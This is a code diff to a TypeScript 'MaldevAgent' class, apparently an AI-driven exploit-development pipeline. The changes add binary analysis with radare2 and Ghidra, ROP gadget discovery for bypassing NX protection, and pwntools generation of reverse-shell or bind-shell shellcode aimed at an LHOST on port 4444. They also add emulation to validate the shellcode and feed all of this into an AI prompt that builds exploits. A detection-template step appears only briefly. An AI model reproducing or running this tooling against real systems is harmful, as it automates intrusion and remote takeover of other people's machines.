@@ -123,39 +123,69 @@ export class MaldevAgent extends BaseTaskAgent {
     const exploitPlan = this.analyzeResearchPackage(researchPackage);
     await this.reportProgress(task.id || 'maldev', 15, `Plan: ${exploitPlan.approach}`);
 
-    // Phase 1b: Tool-Assisted Analysis (NEW - v2.4.4)
+    // Phase 1b: Tool-Assisted Analysis (v2.4.4)
     if (useToolIntegration) {
-      await this.reportProgress(task.id || 'maldev', 20, 'Running tool-assisted analysis...');
-      
-      // Check if we have PoC code or exploit with source
-      const pocWithCode = researchPackage.exploits.find(e => e.code && e.type === 'poc');
-      
-      if (pocWithCode) {
-        console.log('[Maldev Agent] PoC code found - performing binary analysis');
-        // Note: Binary analysis would require the actual binary file
-        // For now, we'll focus on shellcode generation which doesn't need a binary
+      await this.reportProgress(task.id || 'maldev', 18, 'Running tool-assisted analysis...');
+      const targetOS = (researchPackage.methodology.targetOS || 'linux') as 'linux' | 'windows';
+      const lhost = process.env.LHOST || '0.0.0.0';
+      const lport = 4444;
+
+      // Step 1: Binary analysis (if PoC binary path available in shared volume)
+      const pocWithBinary = researchPackage.exploits.find(
+        e => e.code && (e.type === 'poc' || e.type === 'github') && (e as any).binaryPath
+      );
+      const binaryPath = (pocWithBinary as any)?.binaryPath as string | undefined;
+      if (binaryPath) {
+        try {
+          console.log(`[Maldev Agent] Analyzing binary: ${binaryPath}`);
+          binaryAnalysis = await maldevToolExecutor.analyzeWithRadare2(binaryPath);
+          console.log(`[Maldev Agent] Binary analysis: arch=${binaryAnalysis.architecture}, NX=${binaryAnalysis.protections.nx}`);
+          await this.reportProgress(task.id || 'maldev', 20, `Binary analyzed: ${binaryAnalysis.architecture}`);
+
+          // Step 1b: Deep analysis with Ghidra (if available)
+          const ghidraResult = await maldevToolExecutor.analyzeWithGhidra(binaryPath);
+          if (ghidraResult.available && ghidraResult.functions.length > 0) {
+            console.log(`[Maldev Agent] Ghidra deep analysis: ${ghidraResult.functions.length} functions`);
+            (binaryAnalysis as any).ghidraFunctions = ghidraResult.functions.slice(0, 20);
+            (binaryAnalysis as any).ghidraCrossRefs = ghidraResult.crossReferences.slice(0, 20);
+            await this.reportProgress(task.id || 'maldev', 22, `Ghidra: ${ghidraResult.functions.length} functions decompiled`);
+          }
+        } catch (error) {
+          console.warn('[Maldev Agent] Binary analysis failed (continuing):', error instanceof Error ? error.message : error);
+        }
       }
 
-      // Generate shellcode using pwntools for the target platform
-      if (researchPackage.methodology.payloadType === 'reverse_shell') {
+      // Step 2: ROP gadget discovery (if binary available and NX enabled)
+      if (binaryAnalysis && binaryPath && binaryAnalysis.protections.nx) {
         try {
-          const targetOS = researchPackage.methodology.targetOS || 'linux';
-          const lhost = process.env.LHOST || '0.0.0.0';
-          const lport = 4444;
+          console.log('[Maldev Agent] Finding ROP gadgets...');
+          const gadgets = await maldevToolExecutor.findGadgets(binaryPath, 200);
+          if (gadgets.length > 0) {
+            console.log(`[Maldev Agent] Found ${gadgets.length} ROP gadgets`);
+            // Attach gadgets to binary analysis for AI prompt enrichment
+            (binaryAnalysis as any).ropGadgets = gadgets.slice(0, 50);
+          }
+          await this.reportProgress(task.id || 'maldev', 24, `Found ${gadgets.length} ROP gadgets`);
+        } catch (error) {
+          console.warn('[Maldev Agent] ROP gadget discovery failed (continuing):', error instanceof Error ? error.message : error);
+        }
+      }
 
+      // Step 3: Shellcode generation (pwntools)
+      const payloadType = researchPackage.methodology.payloadType || 'reverse_shell';
+      if (payloadType === 'reverse_shell' || payloadType === 'bind_shell') {
+        try {
           console.log(`[Maldev Agent] Generating ${targetOS} shellcode with pwntools`);
           shellcodeData = await maldevToolExecutor.generateShellcode(
-            targetOS as 'linux' | 'windows',
+            targetOS,
             'x64',
-            'reverse_shell',
+            payloadType as 'reverse_shell' | 'bind_shell',
             { lhost, lport }
           );
-          
           console.log(`[Maldev Agent] Generated shellcode: ${shellcodeData.length} bytes`);
-          await this.reportProgress(task.id || 'maldev', 25, `Generated shellcode: ${shellcodeData.length} bytes`);
+          await this.reportProgress(task.id || 'maldev', 28, `Generated shellcode: ${shellcodeData.length} bytes`);
         } catch (error) {
-          console.error('[Maldev Agent] Shellcode generation failed:', error);
-          // Continue with AI-only generation
+          console.warn('[Maldev Agent] Shellcode generation failed (continuing):', error instanceof Error ? error.message : error);
         }
       }
     }
@@ -184,7 +214,25 @@ export class MaldevAgent extends BaseTaskAgent {
       }
     }
 
-    // Phase 2b: Generate Nuclei detection template
+    // Phase 2b: Validate shellcode via unicorn emulation
+    if (useToolIntegration && shellcodeData?.payload) {
+      try {
+        await this.reportProgress(task.id || 'maldev', 45, 'Validating shellcode with unicorn emulation');
+        const emulationResult = await maldevToolExecutor.emulateShellcode(
+          shellcodeData.payload,
+          shellcodeData.architecture
+        );
+        if (emulationResult.success && !emulationResult.crashed) {
+          console.log('[Maldev Agent] Shellcode emulation: PASSED');
+        } else {
+          console.warn(`[Maldev Agent] Shellcode emulation: ${emulationResult.crashed ? 'CRASHED' : 'INCOMPLETE'}`);
+        }
+      } catch (error) {
+        console.warn('[Maldev Agent] Shellcode emulation failed (non-blocking):', error instanceof Error ? error.message : error);
+      }
+    }
+
+    // Phase 2c: Generate Nuclei detection template
     await this.reportProgress(task.id || 'maldev', 55, 'Generating Nuclei detection template');
     const nucleiTemplate = await this.generateNucleiTemplate(researchPackage);
     if (nucleiTemplate) {
@@ -285,6 +333,15 @@ export class MaldevAgent extends BaseTaskAgent {
 - Protections: NX=${binaryAnalysis.protections.nx}, PIE=${binaryAnalysis.protections.pie}, Canary=${binaryAnalysis.protections.canary}
 - Vulnerable Functions: ${binaryAnalysis.vulnerableFunctions.map(v => v.name).join(', ')}
 - Imported Functions: ${binaryAnalysis.importedFunctions.slice(0, 10).join(', ')}`;
+      const ropGadgets = (binaryAnalysis as any).ropGadgets;
+      if (ropGadgets?.length > 0) {
+        enhancedContext += `\n- ROP Gadgets Found: ${ropGadgets.length} (useful for NX bypass)`;
+        enhancedContext += `\n- Key Gadgets: ${ropGadgets.slice(0, 5).map((g: any) => g.instructions).join('; ')}`;
+      }
+      const ghidraFunctions = (binaryAnalysis as any).ghidraFunctions;
+      if (ghidraFunctions?.length > 0) {
+        enhancedContext += `\n- Ghidra Decompiled Functions: ${ghidraFunctions.map((f: any) => f.name).join(', ')}`;
+      }
     }
 
     if (shellcodeData) {
